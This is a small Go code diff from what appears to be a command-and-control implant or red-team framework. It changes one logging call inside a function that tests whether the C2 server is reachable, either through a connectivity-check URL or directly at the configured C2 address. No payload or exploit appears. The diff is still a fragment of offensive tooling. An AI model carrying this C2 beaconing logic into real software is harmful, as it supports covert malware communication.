@@ -13,6 +13,6 @@ func isC2Reachable() bool {
 		return transport.TestConnectivity(transport.UbuntuConnectivityURL, common.RuntimeConfig.C2TransportProxy)
 	}
 
-	logging.Println("NCSI is disabled, trying direct C2 connection")
+	logging.Infof("NCSI is disabled, trying direct C2 connection")
 	return transport.TestConnectivity(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 }
